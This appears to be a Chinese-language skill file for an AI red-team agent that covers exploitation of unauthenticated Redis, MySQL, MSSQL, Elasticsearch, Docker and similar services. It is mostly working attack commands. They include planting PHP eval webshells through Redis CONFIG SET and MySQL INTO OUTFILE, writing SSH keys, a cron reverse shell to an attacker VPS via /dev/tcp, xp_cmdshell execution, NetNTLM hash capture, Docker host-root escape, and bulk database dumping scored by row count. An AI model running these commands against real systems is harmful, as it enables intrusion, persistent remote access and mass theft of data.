---
name: unauth-exploit
description: 未授权访问与信息泄露利用链：Redis/MySQL/MSSQL/ES/Docker/MongoDB 等暴露服务直取数据或写马
whenToUse: fscan/nmap 发现暴露的数据库与中间件端口（6379/3306/1433/9200/27017/2375），或 Web 侧发现未授权接口
role: exploit
enabled: true
---

# 未授权访问利用（暴露服务的直取与写马）

公网上暴露的 Redis/MySQL/ES/Docker 是**性价比最高的得分点**：不用漏洞、不用爆破，
连上去就是数据权限（`db-credential`）甚至服务器权限（写文件/写计划任务 → `server-host`）。
内网里这些服务的命中率更高（技能 `fscan-intranet` 会直接把未授权项报出来）。

## 判定顺序（先轻后重）

1. **只读探测**（确认未授权，不改变任何状态）：`INFO`/`PING`/`SELECT`/列库列表；
2. **取数据**（`db-credential` 得分）：读库、读表、导出敏感数据；
3. **写权限利用**（`server-host`/`server-host` 得分）：写文件、写计划任务、写 SSH key、主从复制 RCE；
4. **每一步都必须留证据**（原始命令 + 回显）。

## 一、Redis（6379）——最高频

```bash
# 1) 未授权判定（不写任何东西）
redis-cli -h <target> -p 6379 INFO server        # 返回 redis_version 即未授权
redis-cli -h <target> -p 6379 CONFIG GET dir
redis-cli -h <target> -p 6379 KEYS '*' | head -50

# 2) 取数据（db-access）
redis-cli -h <target> -p 6379 --scan --pattern '*' > runs/redis-keys.txt
redis-cli -h <target> -p 6379 GET <key>
redis-cli -h <target> -p 6379 DUMP <key> > runs/redis-dump-<key>.bin

# 3) 写文件 → 拿服务器权限（需 CONFIG SET 可用）
#    a. 写 WebShell（知道 web 根目录时最直接）
redis-cli -h <target> -p 6379 CONFIG SET dir /var/www/html
redis-cli -h <target> -p 6379 CONFIG SET dbfilename shell.php
redis-cli -h <target> -p 6379 SET x '<?php @eval($_POST["c"]);?>'
redis-cli -h <target> -p 6379 SAVE
#    b. 写 SSH 公钥（目标有 root 且允许密钥登录）
redis-cli -h <target> -p 6379 CONFIG SET dir /root/.ssh
redis-cli -h <target> -p 6379 CONFIG SET dbfilename authorized_keys
redis-cli -h <target> -p 6379 SET x '<你的公钥>'
redis-cli -h <target> -p 6379 SAVE
#    c. 写计划任务（反弹 shell）
redis-cli -h <target> -p 6379 CONFIG SET dir /var/spool/cron
redis-cli -h <target> -p 6379 CONFIG SET dbfilename root
redis-cli -h <target> -p 6379 SET x '\n\n*/1 * * * * bash -i >& /dev/tcp/$REDTEAM_VPS_HOST/9001 0>&1\n\n'
redis-cli -h <target> -p 6379 SAVE

# 4) 主从复制 RCE（Redis 4.x/5.x，模块加载）
#    用现成工具（redis-rogue-server / redis-ssrf），先 redteam_poc_search 查知识库有无现成脚本
```

> **落地成可交付入口**：写进去的必须是**冰蝎马/哥斯拉马**（技能 `webshell-toolkit`），
> 一句话马用户连不上、不算交付；写完立刻用客户端实测连接。

## 二、MySQL / MariaDB（3306）

```bash
# 1) 未授权或弱口令（先试空口令/root 空口令，再用 credential-attack 爆破）
mysql -h <target> -u root -p'' -e "select version();"
mysql -h <target> -u root -p'root' -e "show databases;"

# 2) 取数据（db-access，注意"大量敏感信息"门槛是 ≥100 万条）
mysql -h <target> -u root -p'xxx' -e "show databases;"
mysql -h <target> -u root -p'xxx' -D <db> -e "show tables;"
mysqldump -h <target> -u root -p'xxx' --databases <db> > runs/mysql-<target>.sql
wc -l runs/mysql-<target>.sql

# 3) 写文件 → getshell（需 FILE 权限 + secure_file_priv 为空）
mysql -h <target> -u root -p'xxx' -e "select '<?php @eval(\$_POST[c]);?>' into outfile '/var/www/html/s.php';"

# 4) UDF 提权（Linux：lib_mysqludf_sys；Windows：udf.dll 到插件目录）
#    先 redteam_poc_search 查知识库有无现成 UDF 脚本，避免手搓
```

## 三、MSSQL（1433）

```bash
# 1) 弱口令/未授权
impacket-mssqlclient <user>:<pass>@<target> -windows-auth     # 或 sa/<pass>
# 2) 开 xp_cmdshell 执行命令（需 sysadmin）
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
# 3) 抓哈希提权 / 提权到 sysadmin
SQL> EXEC master.dbo.xp_dirtree '\\<你的IP>\share'     # 配合 Responder 抓 NetNTLM
```

## 四、Elasticsearch（9200）

```bash
curl -s http://<target>:9200/                                    # 返回 cluster_name 即未授权
curl -s http://<target>:9200/_cat/indices?v                      # 列索引（含业务库名，直接看出数据价值）
curl -s http://<target>:9200/<index>/_search?size=5&pretty        # 取样本
curl -s http://<target>:9200/<index>/_search?size=1000 -o runs/es-<index>.json   # 批量导出
# 量级统计（"大量敏感信息"要报实际条数）
curl -s "http://<target>:9200/<index>/_count?pretty"
```

## 五、Docker API（2375/2376）——直通 root

```bash
curl -s http://<target>:2375/version        # 返回 JSON 即未授权
curl -s http://<target>:2375/containers/json
# 挂载宿主机根目录起容器 → 直接拿宿主 root
docker -H tcp://<target>:2375 run -it -v /:/mnt alpine chroot /mnt sh
# 无 docker 客户端时用 API 直接创建容器（先 redteam_poc_search 查知识库脚本）
```

## 六、其它常见未授权

| 服务 | 端口 | 判定 | 利用 |
| --- | --- | --- | --- |
| MongoDB | 27017 | `mongosh <ip>:27017` 无认证可列库 | 导库（`db-credential`） |
| Memcached | 11211 | `stats` 有回显 | 读缓存数据 |
| ZooKeeper | 2181 | `echo stat \| nc <ip> 2181` | 列节点取配置 |
| RabbitMQ | 15672 | `guest/guest` 登录管理台 | 读消息、看连接串 |
| Hadoop YARN | 8088 | REST API 未授权 | 提交任务 RCE |
| Jenkins | 8080 | `/script` 未授权 | Groovy 执行命令 RCE |
| Kibana | 5601 | 未授权 | 读 ES 数据 |
| rsync | 873 | `rsync <ip>::` 列模块 | 同步取文件 |
| NFS | 2049 | `showmount -e <ip>` | 挂载读文件 |
| SMB 共享 | 445 | `smbclient -L //<ip> -N` | 空会话读共享 |
| JDWP | 5005/8000 | 调试端口暴露 | 直接执行代码（先查知识库脚本） |

## 七、纪律与边界

1. **只读优先**：先 `INFO`/`SELECT`/`_cat/indices` 这类只读命令确认未授权，**再**考虑写操作。
2. **写操作要评估破坏性**：`CONFIG SET dir` 改 Redis 配置、写计划任务、UDF 提权都可能影响业务；
   **生产库不要跑 `FLUSHALL`/`KEYS *` 全量拉取**（会阻塞服务），用 `--scan` 增量扫。
3. **导出量要如实统计**：`bigdata-system` 的 `evidence` 必须写**实际导出条数**（≥100 万条才算"大量敏感信息"得分点）。
4. **一个服务只算一次分**：同一资产同一端口的数据库权限按最高权限算一次（`db-credential` 按服务封顶）。
5. **内网目标走隧道**：所有命令加 `proxychains4 -f runs/proxychains-<port>.conf`（技能 `suo5-tunnel`），
   **不要修改系统 proxychains 配置**（用 `-f` 指向 `runs/` 下的临时配置，用完删除）。

## 八、输出与落库（强制）

1. **未授权本身先落一条漏洞**：`redteam_vuln_add`（`title`=`Redis 未授权访问`、`severity=critical`、
   `target`=**带端口** `10.0.0.5:6379`、`evidence`=实际回显 `INFO` 输出片段、`confidence=confirmed`、
   `gained`=`数据库权限/可写文件`），配 `redteam_http_evidence_add`（原始命令与响应）。
2. **拿到数据权限记分**：`redteam_score_hit`（`db-credential`），`target` 必须**带端口**，`evidence` 写「资产:端口｜拿到什么」
   （如 `10.0.0.5:3306｜root 全库读取，导出 user 表 132 万条`）。
3. **拿到服务器权限记分**：`server-host` / `server-host`（写马成功并实测连接后）。
4. **落库凭据**：数据库账号 → `redteam_credential_add`（`source=未授权`/`弱口令`，`tool` 写命令）。
5. **入口落库**：写进去的 WebShell → `redteam_webshell_add`（`shell_type` + `pass_key`），
   隧道 → `redteam_tunnel_add`（`entry_kind` 说清目标侧那一端）。
6. 每个动作 `redteam_chain_add`：`stage_code=internet`（互联网侧）或 `internal`（内网侧），
   `tool` 写**实际命令原文**、`result` 写回显摘要，导出文件放 `runs/`。
7. 测完立刻 `redteam_asset_test` 回写 `status`/`test`/`surface`，避免后来者重复打。
